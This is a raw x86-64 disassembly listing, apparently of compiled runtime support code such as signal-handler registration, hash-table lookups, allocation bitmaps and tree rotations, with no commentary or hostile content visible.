    69684d30:	48 8b 0d 01 47 0f 00 	mov    0xf4701(%rip),%rcx        # 0x69779438
    69684d37:	48 8d 15 07 96 00 00 	lea    0x9607(%rip),%rdx        # 0x6968e345
    69684d3e:	48 89 05 9b fe 0f 00 	mov    %rax,0xffe9b(%rip)        # 0x69784be0
    69684d45:	e8 67 f9 ff ff       	call   0x696846b1
    69684d4a:	48 89 05 0f 7b 10 00 	mov    %rax,0x107b0f(%rip)        # 0x6978c860
    69684d51:	48 83 c4 28          	add    $0x28,%rsp
    69684d55:	c3                   	ret
    69684d56:	48 83 ec 28          	sub    $0x28,%rsp
    69684d5a:	48 8d 0d 3f 9d 00 00 	lea    0x9d3f(%rip),%rcx        # 0x6968eaa0
    69684d61:	e8 c0 fa ff ff       	call   0x69684826
    69684d66:	48 85 c0             	test   %rax,%rax
    69684d69:	48 89 05 c0 46 0f 00 	mov    %rax,0xf46c0(%rip)        # 0x69779430
    69684d70:	75 0c                	jne    0x69684d7e
    69684d72:	48 8d 0d 07 9d 00 00 	lea    0x9d07(%rip),%rcx        # 0x6968ea80
    69684d79:	e8 21 fa ff ff       	call   0x6968479f
    69684d7e:	48 8d 15 60 96 00 00 	lea    0x9660(%rip),%rdx        # 0x6968e3e5
    69684d85:	48 89 c1             	mov    %rax,%rcx
    69684d88:	e8 24 f9 ff ff       	call   0x696846b1
    69684d8d:	48 89 05 fc fa 0f 00 	mov    %rax,0xffafc(%rip)        # 0x69784890
    69684d94:	48 83 c4 28          	add    $0x28,%rsp
    69684d98:	c3                   	ret
    69684d99:	48 8b 41 f0          	mov    -0x10(%rcx),%rax
    69684d9d:	48 c1 f8 03          	sar    $0x3,%rax
    69684da1:	c3                   	ret
    69684da2:	48 83 ec 28          	sub    $0x28,%rsp
    69684da6:	48 8d 15 f5 49 00 00 	lea    0x49f5(%rip),%rdx        # 0x696897a2
    69684dad:	b9 02 00 00 00       	mov    $0x2,%ecx
    69684db2:	e8 81 75 00 00       	call   0x6968c338
    69684db7:	48 8d 15 e4 49 00 00 	lea    0x49e4(%rip),%rdx        # 0x696897a2
    69684dbe:	b9 0b 00 00 00       	mov    $0xb,%ecx
    69684dc3:	e8 70 75 00 00       	call   0x6968c338
    69684dc8:	48 8d 15 d3 49 00 00 	lea    0x49d3(%rip),%rdx        # 0x696897a2
    69684dcf:	b9 16 00 00 00       	mov    $0x16,%ecx
    69684dd4:	e8 5f 75 00 00       	call   0x6968c338
    69684dd9:	48 8d 15 c2 49 00 00 	lea    0x49c2(%rip),%rdx        # 0x696897a2
    69684de0:	b9 08 00 00 00       	mov    $0x8,%ecx
    69684de5:	e8 4e 75 00 00       	call   0x6968c338
    69684dea:	48 8d 15 b1 49 00 00 	lea    0x49b1(%rip),%rdx        # 0x696897a2
    69684df1:	b9 04 00 00 00       	mov    $0x4,%ecx
    69684df6:	48 83 c4 28          	add    $0x28,%rsp
    69684dfa:	e9 39 75 00 00       	jmp    0x6968c338
    69684dff:	56                   	push   %rsi
    69684e00:	53                   	push   %rbx
    69684e01:	48 83 ec 38          	sub    $0x38,%rsp
    69684e05:	48 89 ce             	mov    %rcx,%rsi
    69684e08:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
    69684e0d:	b9 02 00 00 00       	mov    $0x2,%ecx
    69684e12:	ff 15 d8 82 00 00    	call   *0x82d8(%rip)        # 0x6968d0f0
    69684e18:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
    69684e1d:	48 89 f1             	mov    %rsi,%rcx
    69684e20:	ba 01 00 00 00       	mov    $0x1,%edx
    69684e25:	48 89 c3             	mov    %rax,%rbx
    69684e28:	49 89 c1             	mov    %rax,%r9
    69684e2b:	e8 10 75 00 00       	call   0x6968c340
    69684e30:	48 89 d9             	mov    %rbx,%rcx
    69684e33:	48 83 c4 38          	add    $0x38,%rsp
    69684e37:	5b                   	pop    %rbx
    69684e38:	5e                   	pop    %rsi
    69684e39:	e9 12 75 00 00       	jmp    0x6968c350
    69684e3e:	c3                   	ret
    69684e3f:	48 83 ec 18          	sub    $0x18,%rsp
    69684e43:	48 8b 15 b6 cb 0f 00 	mov    0xfcbb6(%rip),%rdx        # 0x69781a00
    69684e4a:	48 8d 44 24 08       	lea    0x8(%rsp),%rax
    69684e4f:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
    69684e54:	4c 8b 44 24 08       	mov    0x8(%rsp),%r8
    69684e59:	31 c0                	xor    %eax,%eax
    69684e5b:	49 39 c8             	cmp    %rcx,%r8
    69684e5e:	77 06                	ja     0x69684e66
    69684e60:	48 39 ca             	cmp    %rcx,%rdx
    69684e63:	0f 93 c0             	setae  %al
    69684e66:	48 83 c4 18          	add    $0x18,%rsp
    69684e6a:	c3                   	ret
    69684e6b:	48 8b 05 8e ec 0f 00 	mov    0xfec8e(%rip),%rax        # 0x69783b00
    69684e72:	c3                   	ret
    69684e73:	48 83 ec 28          	sub    $0x28,%rsp
    69684e77:	48 8b 41 08          	mov    0x8(%rcx),%rax
    69684e7b:	48 8b 40 28          	mov    0x28(%rax),%rax
    69684e7f:	48 85 c0             	test   %rax,%rax
    69684e82:	74 14                	je     0x69684e98
    69684e84:	48 ff 05 d5 cb 0f 00 	incq   0xfcbd5(%rip)        # 0x69781a60
    69684e8b:	48 83 c1 10          	add    $0x10,%rcx
    69684e8f:	ff d0                	call   *%rax
    69684e91:	48 ff 0d c8 cb 0f 00 	decq   0xfcbc8(%rip)        # 0x69781a60
    69684e98:	48 83 c4 28          	add    $0x28,%rsp
    69684e9c:	c3                   	ret
    69684e9d:	48 89 c8             	mov    %rcx,%rax
    69684ea0:	48 39 00             	cmp    %rax,(%rax)
    69684ea3:	74 1e                	je     0x69684ec3
    69684ea5:	48 8b 48 10          	mov    0x10(%rax),%rcx
    69684ea9:	48 39 ca             	cmp    %rcx,%rdx
    69684eac:	72 06                	jb     0x69684eb4
    69684eae:	48 3b 50 18          	cmp    0x18(%rax),%rdx
    69684eb2:	72 11                	jb     0x69684ec5
    69684eb4:	48 39 ca             	cmp    %rcx,%rdx
    69684eb7:	0f 97 c1             	seta   %cl
    69684eba:	0f b6 c9             	movzbl %cl,%ecx
    69684ebd:	48 8b 04 c8          	mov    (%rax,%rcx,8),%rax
    69684ec1:	eb dd                	jmp    0x69684ea0
    69684ec3:	31 c0                	xor    %eax,%eax
    69684ec5:	c3                   	ret
    69684ec6:	b0 01                	mov    $0x1,%al
    69684ec8:	c3                   	ret
    69684ec9:	48 89 c8             	mov    %rcx,%rax
    69684ecc:	c3                   	ret
    69684ecd:	c3                   	ret
    69684ece:	c3                   	ret
    69684ecf:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
    69684ed3:	48 39 09             	cmp    %rcx,(%rcx)
    69684ed6:	74 0a                	je     0x69684ee2
    69684ed8:	48 8b 41 18          	mov    0x18(%rcx),%rax
    69684edc:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    69684ee0:	eb f1                	jmp    0x69684ed3
    69684ee2:	c3                   	ret
    69684ee3:	31 c0                	xor    %eax,%eax
    69684ee5:	48 8b 11             	mov    (%rcx),%rdx
    69684ee8:	48 39 ca             	cmp    %rcx,%rdx
    69684eeb:	74 09                	je     0x69684ef6
    69684eed:	48 8b 41 10          	mov    0x10(%rcx),%rax
    69684ef1:	48 89 d1             	mov    %rdx,%rcx
    69684ef4:	eb ef                	jmp    0x69684ee5
    69684ef6:	c3                   	ret
    69684ef7:	48 83 ec 18          	sub    $0x18,%rsp
    69684efb:	48 8d 44 24 08       	lea    0x8(%rsp),%rax
    69684f00:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
    69684f05:	48 8b 54 24 08       	mov    0x8(%rsp),%rdx
    69684f0a:	31 c0                	xor    %eax,%eax
    69684f0c:	48 85 d2             	test   %rdx,%rdx
    69684f0f:	74 0b                	je     0x69684f1c
    69684f11:	48 8b 54 24 08       	mov    0x8(%rsp),%rdx
    69684f16:	48 8b 01             	mov    (%rcx),%rax
    69684f19:	48 29 d0             	sub    %rdx,%rax
    69684f1c:	48 83 c4 18          	add    $0x18,%rsp
    69684f20:	c3                   	ret
    69684f21:	48 8d 0d d8 ca 0f 00 	lea    0xfcad8(%rip),%rcx        # 0x69781a00
    69684f28:	eb cd                	jmp    0x69684ef7
    69684f2a:	48 83 ec 28          	sub    $0x28,%rsp
    69684f2e:	48 8b 05 4b 06 10 00 	mov    0x10064b(%rip),%rax        # 0x69785580
    69684f35:	48 3d ab 0d 00 00    	cmp    $0xdab,%rax
    69684f3b:	7e 24                	jle    0x69684f61
    69684f3d:	b9 02 00 00 00       	mov    $0x2,%ecx
    69684f42:	ff 15 a8 81 00 00    	call   *0x81a8(%rip)        # 0x6968d0f0
    69684f48:	48 8d 15 aa 94 00 00 	lea    0x94aa(%rip),%rdx        # 0x6968e3f9
    69684f4f:	48 89 c1             	mov    %rax,%rcx
    69684f52:	e8 cf ca ff ff       	call   0x69681a26
    69684f57:	b9 01 00 00 00       	mov    $0x1,%ecx
    69684f5c:	e8 df 76 00 00       	call   0x6968c640
    69684f61:	48 8d 15 18 5c 0f 00 	lea    0xf5c18(%rip),%rdx        # 0x6977ab80
    69684f68:	48 89 0c c2          	mov    %rcx,(%rdx,%rax,8)
    69684f6c:	48 ff c0             	inc    %rax
    69684f6f:	48 89 05 0a 06 10 00 	mov    %rax,0x10060a(%rip)        # 0x69785580
    69684f76:	48 83 c4 28          	add    $0x28,%rsp
    69684f7a:	c3                   	ret
    69684f7b:	48 8d 0d d4 1a 00 00 	lea    0x1ad4(%rip),%rcx        # 0x69686a56
    69684f82:	eb a6                	jmp    0x69684f2a
    69684f84:	48 8d 0d d9 1a 00 00 	lea    0x1ad9(%rip),%rcx        # 0x69686a64
    69684f8b:	eb 9d                	jmp    0x69684f2a
    69684f8d:	48 83 ec 28          	sub    $0x28,%rsp
    69684f91:	48 8d 0d 1a 1b 00 00 	lea    0x1b1a(%rip),%rcx        # 0x69686ab2
    69684f98:	e8 8d ff ff ff       	call   0x69684f2a
    69684f9d:	48 8d 0d 00 1b 00 00 	lea    0x1b00(%rip),%rcx        # 0x69686aa4
    69684fa4:	48 83 c4 28          	add    $0x28,%rsp
    69684fa8:	eb 80                	jmp    0x69684f2a
    69684faa:	4c 8b 49 08          	mov    0x8(%rcx),%r9
    69684fae:	48 8b 49 18          	mov    0x18(%rcx),%rcx
    69684fb2:	49 89 d0             	mov    %rdx,%r8
    69684fb5:	4d 21 c8             	and    %r9,%r8
    69684fb8:	4a 8b 04 c1          	mov    (%rcx,%r8,8),%rax
    69684fbc:	48 85 c0             	test   %rax,%rax
    69684fbf:	74 12                	je     0x69684fd3
    69684fc1:	48 39 50 08          	cmp    %rdx,0x8(%rax)
    69684fc5:	74 0c                	je     0x69684fd3
    69684fc7:	4f 8d 04 80          	lea    (%r8,%r8,4),%r8
    69684fcb:	49 ff c0             	inc    %r8
    69684fce:	4d 21 c8             	and    %r9,%r8
    69684fd1:	eb e5                	jmp    0x69684fb8
    69684fd3:	c3                   	ret
    69684fd4:	48 83 ec 28          	sub    $0x28,%rsp
    69684fd8:	49 89 d2             	mov    %rdx,%r10
    69684fdb:	48 c1 ea 0c          	shr    $0xc,%rdx
    69684fdf:	e8 c6 ff ff ff       	call   0x69684faa
    69684fe4:	31 d2                	xor    %edx,%edx
    69684fe6:	48 85 c0             	test   %rax,%rax
    69684fe9:	74 1f                	je     0x6968500a
    69684feb:	49 c1 ea 04          	shr    $0x4,%r10
    69684fef:	ba 01 00 00 00       	mov    $0x1,%edx
    69684ff4:	41 0f b6 ca          	movzbl %r10b,%ecx
    69684ff8:	49 89 c8             	mov    %rcx,%r8
    69684ffb:	48 d3 e2             	shl    %cl,%rdx
    69684ffe:	49 c1 e8 06          	shr    $0x6,%r8
    69685002:	4a 85 54 c0 10       	test   %rdx,0x10(%rax,%r8,8)
    69685007:	0f 95 c2             	setne  %dl
    6968500a:	89 d0                	mov    %edx,%eax
    6968500c:	48 83 c4 28          	add    $0x28,%rsp
    69685010:	c3                   	ret
    69685011:	48 85 d2             	test   %rdx,%rdx
    69685014:	74 0b                	je     0x69685021
    69685016:	48 8d 4c 11 ff       	lea    -0x1(%rcx,%rdx,1),%rcx
    6968501b:	48 f7 da             	neg    %rdx
    6968501e:	48 21 d1             	and    %rdx,%rcx
    69685021:	48 89 c8             	mov    %rcx,%rax
    69685024:	c3                   	ret
    69685025:	48 83 ec 28          	sub    $0x28,%rsp
    69685029:	49 89 c8             	mov    %rcx,%r8
    6968502c:	b9 10 00 00 00       	mov    $0x10,%ecx
    69685031:	e8 db ff ff ff       	call   0x69685011
    69685036:	4c 01 c0             	add    %r8,%rax
    69685039:	48 83 c4 28          	add    $0x28,%rsp
    6968503d:	c3                   	ret
    6968503e:	48 8b 42 10          	mov    0x10(%rdx),%rax
    69685042:	48 8b 00             	mov    (%rax),%rax
    69685045:	48 83 f8 02          	cmp    $0x2,%rax
    69685049:	74 23                	je     0x6968506e
    6968504b:	7f 07                	jg     0x69685054
    6968504d:	48 ff c8             	dec    %rax
    69685050:	74 12                	je     0x69685064
    69685052:	eb 0c                	jmp    0x69685060
    69685054:	48 83 f8 04          	cmp    $0x4,%rax
    69685058:	74 1e                	je     0x69685078
    6968505a:	48 83 f8 08          	cmp    $0x8,%rax
    6968505e:	74 21                	je     0x69685081
    69685060:	31 c0                	xor    %eax,%eax
    69685062:	eb 25                	jmp    0x69685089
    69685064:	48 8b 42 08          	mov    0x8(%rdx),%rax
    69685068:	0f b6 04 08          	movzbl (%rax,%rcx,1),%eax
    6968506c:	eb 1b                	jmp    0x69685089
    6968506e:	48 8b 42 08          	mov    0x8(%rdx),%rax
    69685072:	0f b7 04 08          	movzwl (%rax,%rcx,1),%eax
    69685076:	eb 11                	jmp    0x69685089
    69685078:	48 8b 42 08          	mov    0x8(%rdx),%rax
    6968507c:	8b 04 08             	mov    (%rax,%rcx,1),%eax
    6968507f:	eb 08                	jmp    0x69685089
    69685081:	48 8b 42 08          	mov    0x8(%rdx),%rax
    69685085:	48 8b 04 08          	mov    (%rax,%rcx,1),%rax
    69685089:	c3                   	ret
    6968508a:	48 83 ec 28          	sub    $0x28,%rsp
    6968508e:	e8 ab ff ff ff       	call   0x6968503e
    69685093:	48 8b 4a 20          	mov    0x20(%rdx),%rcx
    69685097:	48 8b 52 28          	mov    0x28(%rdx),%rdx
    6968509b:	48 39 c1             	cmp    %rax,%rcx
    6968509e:	76 09                	jbe    0x696850a9
    696850a0:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
    696850a4:	48 85 c0             	test   %rax,%rax
    696850a7:	75 04                	jne    0x696850ad
    696850a9:	48 8b 04 ca          	mov    (%rdx,%rcx,8),%rax
    696850ad:	48 83 c4 28          	add    $0x28,%rsp
    696850b1:	c3                   	ret
    696850b2:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    696850b6:	49 8b 40 08          	mov    0x8(%r8),%rax
    696850ba:	48 21 c8             	and    %rcx,%rax
    696850bd:	4c 8d 0c c2          	lea    (%rdx,%rax,8),%r9
    696850c1:	49 83 39 00          	cmpq   $0x0,(%r9)
    696850c5:	75 04                	jne    0x696850cb
    696850c7:	4d 89 01             	mov    %r8,(%r9)
    696850ca:	c3                   	ret
    696850cb:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
    696850cf:	48 ff c0             	inc    %rax
    696850d2:	48 21 c8             	and    %rcx,%rax
    696850d5:	eb e6                	jmp    0x696850bd
    696850d7:	53                   	push   %rbx
    696850d8:	48 83 ec 30          	sub    $0x30,%rsp
    696850dc:	49 89 d3             	mov    %rdx,%r11
    696850df:	48 8b 52 08          	mov    0x8(%rdx),%rdx
    696850e3:	48 89 cb             	mov    %rcx,%rbx
    696850e6:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    696850eb:	e8 ec c8 ff ff       	call   0x696819dc
    696850f0:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
    696850f5:	49 8b 43 10          	mov    0x10(%r11),%rax
    696850f9:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    696850fe:	48 85 c0             	test   %rax,%rax
    69685101:	74 08                	je     0x6968510b
    69685103:	49 8b 53 18          	mov    0x18(%r11),%rdx
    69685107:	48 89 50 18          	mov    %rdx,0x18(%rax)
    6968510b:	49 8b 53 18          	mov    0x18(%r11),%rdx
    6968510f:	48 85 d2             	test   %rdx,%rdx
    69685112:	74 04                	je     0x69685118
    69685114:	48 89 42 10          	mov    %rax,0x10(%rdx)
    69685118:	4c 89 c0             	mov    %r8,%rax
    6968511b:	48 c1 e0 05          	shl    $0x5,%rax
    6968511f:	48 01 c8             	add    %rcx,%rax
    69685122:	48 8d 14 c3          	lea    (%rbx,%rax,8),%rdx
    69685126:	4c 39 9a 78 08 00 00 	cmp    %r11,0x878(%rdx)
    6968512d:	75 45                	jne    0x69685174
    6968512f:	49 8b 43 10          	mov    0x10(%r11),%rax
    69685133:	48 85 c0             	test   %rax,%rax
    69685136:	48 89 82 78 08 00 00 	mov    %rax,0x878(%rdx)
    6968513d:	75 35                	jne    0x69685174
    6968513f:	4e 8d 0c 83          	lea    (%rbx,%r8,4),%r9
    69685143:	b8 01 00 00 00       	mov    $0x1,%eax
    69685148:	83 e1 1f             	and    $0x1f,%ecx
    6968514b:	48 89 c2             	mov    %rax,%rdx
    6968514e:	48 d3 e2             	shl    %cl,%rdx
    69685151:	f7 d2                	not    %edx
    69685153:	41 23 91 14 08 00 00 	and    0x814(%r9),%edx
    6968515a:	41 89 91 14 08 00 00 	mov    %edx,0x814(%r9)
    69685161:	75 11                	jne    0x69685174
    69685163:	44 89 c1             	mov    %r8d,%ecx
    69685166:	83 e1 1f             	and    $0x1f,%ecx
    69685169:	48 d3 e0             	shl    %cl,%rax
    6968516c:	f7 d0                	not    %eax
    6968516e:	21 83 10 08 00 00    	and    %eax,0x810(%rbx)
    69685174:	49 c7 43 18 00 00 00 	movq   $0x0,0x18(%r11)
    6968517b:	00 
    6968517c:	49 c7 43 10 00 00 00 	movq   $0x0,0x10(%r11)
    69685183:	00 
    69685184:	48 83 c4 30          	add    $0x30,%rsp
    69685188:	5b                   	pop    %rbx
    69685189:	c3                   	ret
    6968518a:	48 8b 01             	mov    (%rcx),%rax
    6968518d:	48 8b 50 08          	mov    0x8(%rax),%rdx
    69685191:	4c 8b 48 20          	mov    0x20(%rax),%r9
    69685195:	4c 8b 42 08          	mov    0x8(%rdx),%r8
    69685199:	4d 39 48 20          	cmp    %r9,0x20(%r8)
    6968519d:	75 17                	jne    0x696851b6
    6968519f:	48 89 11             	mov    %rdx,(%rcx)
    696851a2:	48 8b 12             	mov    (%rdx),%rdx
    696851a5:	48 89 50 08          	mov    %rdx,0x8(%rax)
    696851a9:	48 8b 11             	mov    (%rcx),%rdx
    696851ac:	48 89 02             	mov    %rax,(%rdx)
    696851af:	48 8b 01             	mov    (%rcx),%rax
    696851b2:	48 ff 40 20          	incq   0x20(%rax)
    696851b6:	c3                   	ret
    696851b7:	48 8b 01             	mov    (%rcx),%rax
    696851ba:	48 8b 10             	mov    (%rax),%rdx
    696851bd:	4c 8b 40 20          	mov    0x20(%rax),%r8
    696851c1:	4c 39 42 20          	cmp    %r8,0x20(%rdx)
    696851c5:	75 11                	jne    0x696851d8
    696851c7:	48 89 11             	mov    %rdx,(%rcx)
    696851ca:	48 8b 52 08          	mov    0x8(%rdx),%rdx
    696851ce:	48 89 10             	mov    %rdx,(%rax)
    696851d1:	48 8b 11             	mov    (%rcx),%rdx
    696851d4:	48 89 42 08          	mov    %rax,0x8(%rdx)
    696851d8:	c3                   	ret
    696851d9:	48 83 b9 d8 28 00 00 	cmpq   $0x0,0x28d8(%rcx)
    696851e0:	00 
    696851e1:	48 8d 81 d8 28 00 00 	lea    0x28d8(%rcx),%rax
    696851e8:	75 0e                	jne    0x696851f8
    696851ea:	48 89 81 d8 28 00 00 	mov    %rax,0x28d8(%rcx)
    696851f1:	48 89 81 e0 28 00 00 	mov    %rax,0x28e0(%rcx)
    696851f8:	c3                   	ret
    696851f9:	57                   	push   %rdi
    696851fa:	56                   	push   %rsi
    696851fb:	53                   	push   %rbx
    696851fc:	48 83 ec 20          	sub    $0x20,%rsp
    69685200:	48 89 d6             	mov    %rdx,%rsi
    69685203:	48 8b 12             	mov    (%rdx),%rdx
    69685206:	48 89 cb             	mov    %rcx,%rbx
    69685209:	4c 89 c7             	mov    %r8,%rdi
    6968520c:	48 3b 12             	cmp    (%rdx),%rdx
    6968520f:	0f 84 f0 00 00 00    	je     0x69685305
    69685215:	4c 3b 42 10          	cmp    0x10(%rdx),%r8
    69685219:	48 89 91 b8 28 00 00 	mov    %rdx,0x28b8(%rcx)
    69685220:	72 0e                	jb     0x69685230
    69685222:	48 89 91 b0 28 00 00 	mov    %rdx,0x28b0(%rcx)
    69685229:	48 8b 06             	mov    (%rsi),%rax
    6968522c:	48 8d 50 08          	lea    0x8(%rax),%rdx
    69685230:	49 89 f8             	mov    %rdi,%r8
    69685233:	48 89 d9             	mov    %rbx,%rcx
    69685236:	e8 be ff ff ff       	call   0x696851f9
    6968523b:	48 8b 16             	mov    (%rsi),%rdx
    6968523e:	48 3b 93 b8 28 00 00 	cmp    0x28b8(%rbx),%rdx
    69685245:	75 12                	jne    0x69685259
    69685247:	48 8b 83 b0 28 00 00 	mov    0x28b0(%rbx),%rax
    6968524e:	48 3b 00             	cmp    (%rax),%rax
    69685251:	74 06                	je     0x69685259
    69685253:	48 3b 78 10          	cmp    0x10(%rax),%rdi
    69685257:	74 16                	je     0x6968526f
    69685259:	48 8b 42 20          	mov    0x20(%rdx),%rax
    6968525d:	4c 8b 02             	mov    (%rdx),%r8
    69685260:	48 8b 4a 08          	mov    0x8(%rdx),%rcx
    69685264:	48 ff c8             	dec    %rax
    69685267:	49 39 40 20          	cmp    %rax,0x20(%r8)
    6968526b:	7d 45                	jge    0x696852b2
    6968526d:	eb 49                	jmp    0x696852b8
    6968526f:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
    69685273:	48 8b 52 18          	mov    0x18(%rdx),%rdx
    69685277:	48 89 48 10          	mov    %rcx,0x10(%rax)
    6968527b:	48 89 d9             	mov    %rbx,%rcx
    6968527e:	48 89 50 18          	mov    %rdx,0x18(%rax)
    69685282:	e8 52 ff ff ff       	call   0x696851d9
    69685287:	48 89 83 b0 28 00 00 	mov    %rax,0x28b0(%rbx)
    6968528e:	48 8b 06             	mov    (%rsi),%rax
    69685291:	48 8b 40 08          	mov    0x8(%rax),%rax
    69685295:	48 89 06             	mov    %rax,(%rsi)
    69685298:	48 8b 83 b8 28 00 00 	mov    0x28b8(%rbx),%rax
    6968529f:	48 8b 93 c0 28 00 00 	mov    0x28c0(%rbx),%rdx
    696852a6:	48 89 10             	mov    %rdx,(%rax)
    696852a9:	48 89 83 c0 28 00 00 	mov    %rax,0x28c0(%rbx)
    696852b0:	eb 53                	jmp    0x69685305
    696852b2:	48 3b 41 20          	cmp    0x20(%rcx),%rax
    696852b6:	7e 4d                	jle    0x69685305
    696852b8:	48 89 42 20          	mov    %rax,0x20(%rdx)
    696852bc:	48 3b 41 20          	cmp    0x20(%rcx),%rax
    696852c0:	7d 04                	jge    0x696852c6
    696852c2:	48 89 41 20          	mov    %rax,0x20(%rcx)
    696852c6:	48 89 f1             	mov    %rsi,%rcx
    696852c9:	e8 e9 fe ff ff       	call   0x696851b7
    696852ce:	48 8b 06             	mov    (%rsi),%rax
    696852d1:	48 8d 48 08          	lea    0x8(%rax),%rcx
    696852d5:	e8 dd fe ff ff       	call   0x696851b7
    696852da:	48 8b 06             	mov    (%rsi),%rax
    696852dd:	48 8b 48 08          	mov    0x8(%rax),%rcx
    696852e1:	48 83 c1 08          	add    $0x8,%rcx
    696852e5:	e8 cd fe ff ff       	call   0x696851b7
    696852ea:	48 89 f1             	mov    %rsi,%rcx
    696852ed:	e8 98 fe ff ff       	call   0x6968518a
    696852f2:	48 8b 0e             	mov    (%rsi),%rcx
    696852f5:	48 83 c1 08          	add    $0x8,%rcx
    696852f9:	48 83 c4 20          	add    $0x20,%rsp
    696852fd:	5b                   	pop    %rbx
    696852fe:	5e                   	pop    %rsi
    696852ff:	5f                   	pop    %rdi
    69685300:	e9 85 fe ff ff       	jmp    0x6968518a
    69685305:	48 83 c4 20          	add    $0x20,%rsp
    69685309:	5b                   	pop    %rbx
    6968530a:	5e                   	pop    %rsi
    6968530b:	5f                   	pop    %rdi
    6968530c:	c3                   	ret
    6968530d:	48 8b 42 10          	mov    0x10(%rdx),%rax
    69685311:	49 89 ca             	mov    %rcx,%r10
    69685314:	4c 89 c1             	mov    %r8,%rcx
    69685317:	48 c1 e1 05          	shl    $0x5,%rcx
    6968531b:	48 85 c0             	test   %rax,%rax
    6968531e:	49 8d 8c 09 0e 01 00 	lea    0x10e(%r9,%rcx,1),%rcx
    69685325:	00 
    69685326:	49 89 44 ca 08       	mov    %rax,0x8(%r10,%rcx,8)
    6968532b:	75 3c                	jne    0x69685369
    6968532d:	4f 8d 1c 82          	lea    (%r10,%r8,4),%r11
    69685331:	44 89 c9             	mov    %r9d,%ecx
    69685334:	b8 01 00 00 00       	mov    $0x1,%eax
    69685339:	83 e1 1f             	and    $0x1f,%ecx
    6968533c:	49 89 c1             	mov    %rax,%r9
    6968533f:	49 d3 e1             	shl    %cl,%r9
    69685342:	41 f7 d1             	not    %r9d
    69685345:	45 23 8b 14 08 00 00 	and    0x814(%r11),%r9d
    6968534c:	45 89 8b 14 08 00 00 	mov    %r9d,0x814(%r11)
    69685353:	75 1c                	jne    0x69685371
    69685355:	44 89 c1             	mov    %r8d,%ecx
    69685358:	83 e1 1f             	and    $0x1f,%ecx
    6968535b:	48 d3 e0             	shl    %cl,%rax
    6968535e:	f7 d0                	not    %eax
    69685360:	41 21 82 10 08 00 00 	and    %eax,0x810(%r10)
    69685367:	eb 08                	jmp    0x69685371
    69685369:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
    69685370:	00 
    69685371:	48 c7 42 18 00 00 00 	movq   $0x0,0x18(%rdx)
    69685378:	00 
    69685379:	48 c7 42 10 00 00 00 	movq   $0x0,0x10(%rdx)
    69685380:	00 
    69685381:	c3                   	ret
    69685382:	53                   	push   %rbx
    69685383:	48 83 ec 30          	sub    $0x30,%rsp
    69685387:	48 89 d3             	mov    %rdx,%rbx
    6968538a:	48 8b 52 08          	mov    0x8(%rdx),%rdx
    6968538e:	49 89 cb             	mov    %rcx,%r11
    69685391:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    69685396:	e8 41 c6 ff ff       	call   0x696819dc
    6968539b:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
    696853a0:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    696853a5:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
    696853ac:	00 
    696853ad:	48 89 c2             	mov    %rax,%rdx
    696853b0:	48 c1 e2 05          	shl    $0x5,%rdx
    696853b4:	48 01 ca             	add    %rcx,%rdx
    696853b7:	4d 8d 04 d3          	lea    (%r11,%rdx,8),%r8
    696853bb:	49 8b 90 78 08 00 00 	mov    0x878(%r8),%rdx
    696853c2:	48 85 d2             	test   %rdx,%rdx
    696853c5:	48 89 53 10          	mov    %rdx,0x10(%rbx)
    696853c9:	74 04                	je     0x696853cf
    696853cb:	48 89 5a 18          	mov    %rbx,0x18(%rdx)
    696853cf:	ba 01 00 00 00       	mov    $0x1,%edx
    696853d4:	49 89 98 78 08 00 00 	mov    %rbx,0x878(%r8)
    696853db:	83 e1 1f             	and    $0x1f,%ecx
    696853de:	48 89 d3             	mov    %rdx,%rbx
    696853e1:	48 d3 e3             	shl    %cl,%rbx
    696853e4:	89 c1                	mov    %eax,%ecx
    696853e6:	41 09 9c 83 14 08 00 	or     %ebx,0x814(%r11,%rax,4)
    696853ed:	00 
    696853ee:	83 e1 1f             	and    $0x1f,%ecx
    696853f1:	48 d3 e2             	shl    %cl,%rdx
    696853f4:	41 09 93 10 08 00 00 	or     %edx,0x810(%r11)
    696853fb:	48 83 c4 30          	add    $0x30,%rsp
    696853ff:	5b                   	pop    %rbx
    69685400:	c3                   	ret
    69685401:	0f b6 c2             	movzbl %dl,%eax
    69685404:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
    69685408:	48 85 c0             	test   %rax,%rax
    6968540b:	74 0b                	je     0x69685418
    6968540d:	48 39 50 08          	cmp    %rdx,0x8(%rax)
    69685411:	74 05                	je     0x69685418
    69685413:	48 8b 00             	mov    (%rax),%rax
    69685416:	eb f0                	jmp    0x69685408
    69685418:	c3                   	ret
    69685419:	48 83 ec 28          	sub    $0x28,%rsp
    6968541d:	49 89 d0             	mov    %rdx,%r8
    69685420:	48 c1 fa 09          	sar    $0x9,%rdx
    69685424:	e8 d8 ff ff ff       	call   0x69685401
    69685429:	48 85 c0             	test   %rax,%rax
    6968542c:	74 21                	je     0x6968544f
    6968542e:	4c 89 c1             	mov    %r8,%rcx
    69685431:	41 b8 01 00 00 00    	mov    $0x1,%r8d
    69685437:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
    6968543d:	48 89 ca             	mov    %rcx,%rdx
    69685440:	49 d3 e0             	shl    %cl,%r8
    69685443:	48 c1 fa 06          	sar    $0x6,%rdx
    69685447:	49 f7 d0             	not    %r8
    6968544a:	4c 21 44 d0 10       	and    %r8,0x10(%rax,%rdx,8)
    6968544f:	48 83 c4 28          	add    $0x28,%rsp
    69685453:	c3                   	ret
    69685454:	48 83 ec 28          	sub    $0x28,%rsp
    69685458:	4c 8b 5a 08          	mov    0x8(%rdx),%r11
    6968545c:	49 89 c9             	mov    %rcx,%r9
    6968545f:	49 89 d2             	mov    %rdx,%r10
